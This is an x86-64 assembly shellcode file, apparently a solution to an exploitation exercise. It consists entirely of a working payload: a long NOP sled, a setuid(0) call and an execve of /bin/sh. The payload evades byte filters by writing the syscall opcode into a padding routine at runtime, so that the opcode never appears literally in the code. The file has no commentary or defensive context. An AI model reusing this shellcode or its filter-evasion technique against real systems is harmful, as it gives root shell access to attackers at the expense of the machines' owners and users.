.global _start
_start:
.intel_syntax noprefix
.rept 4098
.nop
.endr
######   setuid(0)
	mov rax, 105
	mov rdi, 0
	mov rbx, 0x050e
	inc rbx
	mov word ptr [rip+jexit], bx
	call jexit
######   execve
        mov rax, 59
	mov rsi, 0
	mov rdx, 0
	mov rbx, 0
	push rbx
	mov rbx, 0x0068732f6e69622f
	push rbx
	lea rdi, [rsp]
	nop
	mov rbx, 0x050e
	inc rbx
	mov word ptr [rip+jexit+4], bx
	call jexit
		

jexit:
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	ret
